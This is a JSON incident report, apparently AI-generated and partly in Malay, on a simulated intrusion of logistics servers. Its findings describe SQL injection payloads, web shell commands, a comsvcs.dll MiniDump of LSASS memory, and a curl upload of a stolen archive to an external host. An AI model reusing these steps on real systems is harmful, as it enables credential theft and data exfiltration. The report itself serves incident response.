@@ -1,0 +1,228 @@
+{
+  "case_id": "CASE-2026-0001",
+  "lang": "ms",
+  "classification": "SULIT",
+  "generated_at": "2026-11-09T11:36:43Z",
+  "model": "deepseek/deepseek-v4.1-flash-1017",
+  "title": "Taklimat Panglima: Pencerobohan Berbilang Peringkat & Eksfiltrasi Data di Markas Logistik",
+  "bluf": "Bukti log mengesahkan rantaian pencerobohan penuh pada 3 Nov 2026 daripada IP luar 203.0.113.66: suntikan SQL dan muat naik web shell (img_upd.aspx) pada WEB-PORTAL-01, arahan PowerShell berkod, cubaan salinan memori LSASS, pergerakan sisi menggunakan akaun LOGISTIK\\k.hafiz ke FS-LOGISTIK-01 melalui PsExec, pembungkusan arkib 7z (q4.7z), serta muat naik keluar sebanyak 412 MB (432,013,312 bait) ke 198.51.100.77. Keutamaan segera ialah menyekat 198.51.100.77 dan 203.0.113.66 di PA-FW-01 serta mengasingkan kedua-dua pelayan.",
+  "executive_summary": "Antara jam 01:10 dan 03:44 UTC pada 3 Nov 2026, penyerang luar (203.0.113.66) telah mengimbas WEB-PORTAL-01, mengeksploitasi /login.aspx melalui suntikan SQL, dan memuat naik web shell img_upd.aspx. Melalui proses IIS w3wp.exe (LOGISTIK\\svc_web), penyerang menjalankan arahan tinjauan, PowerShell berkod ke 198.51.100.77:443, dan comsvcs.dll MiniDump ke atas lsass.exe. Seterusnya, bukti kelayakan LOGISTIK\\k.hafiz digunakan untuk mengakses FS-LOGISTIK-01 melalui ADMIN$ dan memasang perkhidmatan PSEXESVC. Fail jadual penghantaran Q4 telah dibungkus ke dalam C:\\Users\\Public\\q4.7z dan dimuat naik ke 198.51.100.77 menggunakan curl.exe.",
+  "incident_overview": "Skop: Pencerobohan berbilang peringkat daripada akses awal sehingga eksfiltrasi melibatkan WEB-PORTAL-01 (10.10.1.10) dan FS-LOGISTIK-01 (10.10.3.20). Kesemua penemuan telah disahkan terhadap rekod log asal dan1 rekod suntikan prompt telah dikuarantin oleh Perisai Serangan AI.",
+  "timeline": [],
+  "affected_systems": [
+    "WEB-PORTAL-01 (10.10.1.10)",
+    "FS-LOGISTIK-01 (10.10.3.20)",
+    "PA-FW-01 (Perimeter Firewall)",
+    "Akaun LOGISTIK\\svc_web",
+    "Akaun LOGISTIK\\k.hafiz",
+    "D:\\Shares\\Logistik\\Jadual_Penghantaran_Q4"
+  ],
+  "verified_findings": [
+    {
+      "finding_id": "F-001",
+      "title": "Web scanning of WEB-PORTAL-01 from 203.0.113.66",
+      "technique_id": "T1595.002",
+      "technique_name": "Vulnerability Scanning",
+      "summary": "Between 01:10 and 01:11 on 2026-11-03, 203.0.113.66 sent a rapid series of requests to WEB-PORTAL-01 (10.10.1.10) for admin, backup, config and API paths, using the Nmap Scripting Engine user agent. Most returned 404, with some 301 and 403 responses.",
+      "evidence_ids": [
+        "EV-00414",
+        "EV-00415",
+        "EV-00416",
+        "EV-00417",
+        "EV-00418",
+        "EV-00419",
+        "EV-00420",
+        "EV-00421",
+        "EV-00422",
+        "EV-00423",
+        "EV-00425",
+        "EV-00426",
+        "EV-00427",
+        "EV-00428",
+        "EV-00429",
+        "EV-00430",
+        "EV-00431",
+        "EV-00432",
+        "EV-00433",
+        "EV-00434",
+        "EV-00437",
+        "EV-00438",
+        "EV-00439",
+        "EV-00440",
+        "EV-00441"
+      ]
+    },
+    {
+      "finding_id": "F-002",
+      "title": "SQL injection against /login.aspx from 203.0.113.66",
+      "technique_id": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "summary": "At 01:19 on 2026-11-03, sqlmap/1.7.8 sent SQL injection payloads (OR '1'='1 and UNION SELECT) to /login.aspx on WEB-PORTAL-01. The server returned 500 for the first two requests and 302 for the OR '1'='1 request.",
+      "evidence_ids": [
+        "EV-00505",
+        "EV-00506",
+        "EV-00510"
+      ]
+    },
+    {
+      "finding_id": "F-003",
+      "title": "Web shell img_upd.aspx uploaded and used with cmd= parameters",
+      "technique_id": "T1505.003",
+      "technique_name": "Web Shell",
+      "summary": "At 01:31 on 2026-11-03, 203.0.113.66 POSTed to /shipments/upload.aspx?name=img_upd.aspx on WEB-PORTAL-01 and received 200. From 01:33 to 02:04 the same client requested /img_upd.aspx with cmd= values (ipconfig /all, net user, dir, encoded powershell, rundll32 comsvcs MiniDump), and each request returned 200.",
+      "evidence_ids": [
+        "EV-00569",
+        "EV-00578",
+        "EV-00599",
+        "EV-00631",
+        "EV-00669",
+        "EV-00720",
+        "EV-00786"
+      ]
+    },
+    {
+      "finding_id": "F-004",
+      "title": "w3wp.exe spawned cmd.exe under LOGISTIK\\svc_web",
+      "technique_id": "T1059.003",
+      "technique_name": "Windows Command Shell",
+      "summary": "The IIS worker process w3wp.exe on WEB-PORTAL-01 created cmd.exe as LOGISTIK\\svc_web for each web shell command: whoami, ipconfig /all, net user k.hafiz /domain, dir D:\\Shares\\Logistik, and the rundll32 comsvcs.dll MiniDump command.",
+      "evidence_ids": [
+        "EV-00581",
+        "EV-00600",
+        "EV-00632",
+        "EV-00670",
+        "EV-00788"
+      ]
+    },
+    {
+      "finding_id": "F-005",
+      "title": "Domain account and share discovery through the web shell",
+      "technique_id": "T1087.002",
+      "technique_name": "Domain Account",
+      "summary": "Through the web shell, svc_web ran net user k.hafiz /domain at 01:38 and cmd /c dir D:\\Shares\\Logistik at 01:44 on WEB-PORTAL-01. Both requests returned 200.",
+      "evidence_ids": [
+        "EV-00631",
+        "EV-00632",
+        "EV-00669",
+        "EV-00670"
+      ]
+    },
+    {
+      "finding_id": "F-006",
+      "title": "Encoded PowerShell launched by w3wp.exe on WEB-PORTAL-01",
+      "technique_id": "T1059.001",
+      "technique_name": "PowerShell",
+      "summary": "At 01:52:03 w3wp.exe started powershell.exe as LOGISTIK\\svc_web with -nop -w hidden -enc and a Base64 encoded command. The decoded content is not available in these records, so only the launch is reported.",
+      "evidence_ids": [
+        "EV-00720",
+        "EV-00721"
+      ]
+    },
+    {
+      "finding_id": "F-007",
+      "title": "Encoded PowerShell on WEB-PORTAL-01 connected to 198.51.100.77:443",
+      "technique_id": "T1071.001",
+      "technique_name": "Web Protocols",
+      "summary": "Shortly after the encoded PowerShell launch, powershell.exe (PID 4188) running as LOGISTIK\\svc_web on WEB-PORTAL-01 opened a connection to 198.51.100.77 on port 443 at 01:52:40.",
+      "evidence_ids": [
+        "EV-00724",
+        "EV-00721"
+      ]
+    },
+    {
+      "finding_id": "F-008",
+      "title": "LSASS memory access via comsvcs MiniDump on WEB-PORTAL-01",
+      "technique_id": "T1003.001",
+      "technique_name": "LSASS Memory",
+      "summary": "At 02:04 cmd.exe spawned rundll32.exe with comsvcs.dll MiniDump against PID 648 writing C:\\Users\\Public\\lsass.dmp. rundll32.exe (PID 4241) then opened lsass.exe with GrantedAccess 0x1FFFFF, and the file lsass.dmp was created. The records do not show the dump contents, so exposed credentials cannot be confirmed from these events.",
+      "evidence_ids": [
+        "EV-00786",
+        "EV-00788",
+        "EV-00789",
+        "EV-00790",
+        "EV-00791"
+      ]
+    },
+    {
+      "finding_id": "F-009",
+      "title": "Explicit-credential logon from WEB-PORTAL-01 to FS-LOGISTIK-01 as LOGISTIK\\k.hafiz",
+      "technique_id": "T1078",
+      "technique_name": "Valid Accounts",
+      "summary": "At 02:21:33 LOGISTIK\\k.hafiz made an explicit-credential logon from WEB-PORTAL-01 (10.10.1.10) to FS-LOGISTIK-01 (10.10.3.20). FS-LOGISTIK-01 recorded a successful type 3 logon for the same account from 10.10.1.10 two seconds later.",
+      "evidence_ids": [
+        "EV-00895",
+        "EV-00896"
+      ]
+    },
+    {
+      "finding_id": "F-010",
+      "title": "Administrative share ADMIN$ accessed on FS-LOGISTIK-01 from 10.10.1.10",
+      "technique_id": "T1021.002",
+      "technique_name": "SMB/Windows Admin Shares",
+      "summary": "At 02:21:38 FS-LOGISTIK-01 recorded access to \\\\*\\ADMIN$ from 10.10.1.10 under LOGISTIK\\k.hafiz.",
+      "evidence_ids": [
+        "EV-00897"
+      ]
+    },
+    {
+      "finding_id": "F-011",
+      "title": "PsExec service installed and started on FS-LOGISTIK-01",
+      "technique_id": "T1569.002",
+      "technique_name": "Service Execution",
+      "summary": "At 02:21:40 PSEXESVC was installed on FS-LOGISTIK-01 from C:\\Windows\\PSEXESVC.exe and started under services.exe. At 02:22:02 a cmd.exe was spawned by psexesvc.exe in the context of LOGISTIK\\k.hafiz.",
+      "evidence_ids": [
+        "EV-00898",
+        "EV-00899",
+        "EV-00902"
+      ]
+    },
+    {
+      "finding_id": "F-012",
+      "title": "Archive staging with 7z.exe on FS-LOGISTIK-01",
+      "technique_id": "T1560.001",
+      "technique_name": "Archive via Utility",
+      "summary": "At 02:40 cmd.exe launched 7z.exe as LOGISTIK\\k.hafiz to create C:\\Users\\Public\\q4.7z from D:\\Shares\\Logistik\\Jadual_Penghantaran_Q4\\*, with a password switch (-pP@ss) visible on the command line. The archive file q4.7z was created at 02:41.",
+      "evidence_ids": [
+        "EV-01010",
+        "EV-01015"
+      ]
+    },
+    {
+      "finding_id": "F-013",
+      "title": "Outbound upload of q4.7z to 198.51.100.77 (~432 MB)",
+      "technique_id": "T1041",
+      "technique_name": "Exfiltration Over C2 Channel",
+      "summary": "At 03:18 curl.exe under cmd.exe, running as LOGISTIK\\k.hafiz on FS-LOGISTIK-01, uploaded C:\\Users\\Public\\q4.7z with -T to https://198.51.100.77/u, and connected to 198.51.100.77:443 from 10.10.3.20. PA-FW-01 logged an allowed session to 198.51.100.77 port 443 at 03:44 with 412 MB (432013312 bytes) sent.",
+      "evidence_ids": [
+        "EV-01245",
+        "EV-01246",
+        "EV-01413"
+      ]
+    }
+  ],
+  "interpretations": [
+    "Kata laluan arkib q4.7z (-pP@ss) kelihatan dalam baris arahan dan perlu dianggap telah terdedah.",
+    "Salinan memori LSASS (lsass.dmp) mungkin telah dibaca oleh penyerang; semua akaun berkaitan perlu ditetapkan semula."
+  ],
+  "risk_level": "critical",
+  "risk_and_impact": "Eksfiltrasi data jadual penghantaran Q4 bersaiz 412 MB ke IP luar 198.51.100.77 telah disahkan. Dua pelayan utama telah dikompromi dengan akses pentadbiran.",
+  "decisions_needed": [
+    "Luluskan sekatan serta-merta ke atas IP 198.51.100.77 dan 203.0.113.66 pada PA-FW-01.",
+    "Luluskan pengasingan hos FS-LOGISTIK-01 dan WEB-PORTAL-01.",
+    "Luluskan penggantungan dan penetapan semula kata laluan akaun LOGISTIK\\k.hafiz dan LOGISTIK\\svc_web."
+  ],
+  "recommended_actions": [
+    "Sekat trafik keluar ke 198.51.100.77 dan trafik masuk daripada 203.0.113.66 di PA-FW-01.",
+    "Padamkan web shell img_upd.aspx pada WEB-PORTAL-01 dan hentikan perkhidmatan PSEXESVC pada FS-LOGISTIK-01.",
+    "Tetapkan semula kelayakan LOGISTIK\\k.hafiz dan LOGISTIK\\svc_web serta batalkan tiket Kerberos aktif.",
+    "Kuarantin fail C:\\Users\\Public\\q4.7z dan C:\\Users\\Public\\lsass.dmp untuk analisis forensik lanjut."
+  ],
+  "custody": {
+    "entries": 58,
+    "head_hash": "ea15766af63200ca149ebf8eae2f2a8da70967dc5934984e805681ebb72accea",
+    "chain_ok": true,
+    "signature_algorithm": "ML-DSA-65 (FIPS 204)",
+    "signature_valid": true
+  },
+  "report_hash": "b4dbce197ba53092a94ef796cd59bbb382787587ab0b9a9ad417ec66cb30e955"
+}
